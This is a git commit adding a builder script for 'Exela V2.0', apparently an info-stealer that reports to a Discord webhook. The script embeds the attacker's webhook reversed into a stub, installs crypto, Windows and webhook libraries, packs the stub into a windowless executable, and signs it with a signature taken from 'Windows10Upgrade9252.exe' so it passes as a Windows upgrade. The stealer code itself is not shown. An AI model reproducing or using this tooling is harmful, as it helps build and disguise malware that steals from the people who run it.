794fa323a7a6cb6b733708bc3f66ce5d4fd03115
quicaxd <127431653+quicaxd@users.noreply.github.com>
2023-07-21 19:04:48 +0300

    Add files via upload

---
+++ Exela V2.0/builder.py
@@ -0,0 +1,48 @@
+import os, shutil
+
+webhook = str(input("enter your webhook url : "))
+with open("Exela.py", "r", encoding="utf-8", errors="ignore") as sourceCode:
+    rip = sourceCode.read()
+    replacedCode = rip.replace('%REPLACE_ME_FOR_QUiCADXD%', webhook[::-1])
+with open("stub.py", "a", encoding="utf-8", errors="ignore") as f:
+    f.write(str(replacedCode))
+
+def installModules():
+    try:
+        print("installing all module pls wait")
+        os.system("pip install psutil")
+        os.system("pip install pypiwin32")
+        os.system("pip install pycrypto")
+        os.system("pip install pycryptodome")
+        os.system("pip install dhooks")
+        os.system("pip install requests")
+        os.system("pip install wmi")
+        os.system("pip install pyinstaller")
+        print("All module installed")
+    except:
+        print("pls use python 3.10 or 3.11");exit()
+
+
+def buildFile():
+    print("Building Your File pls wait.")
+    os.system("pyinstaller --onefile --noconsole --clean stub.py")
+    print("File build was succesfully")
+    print("Signing file pls wait")
+    digitalSign("Windows10Upgrade9252.exe", os.getcwd() + "\\Dist\\stub.exe")
+    print("file signed was succesfully")
+    try:
+        shutil.rmtree("build")
+        os.remove('stub.spec')
+    except:
+        pass # sex
+  
+    os.system("cls")
+    print("your file build succesfully\nYour file is => Exela.exe")
+    shutil.rmtree("dist")
+    
+def digitalSign(path, signedFile):
+    os.system(f"python digital-sign.py -i {signedFile} -t {path} -o Exela.exe")
+
+if __name__ == '__main__':
+    installModules()
+    buildFile()
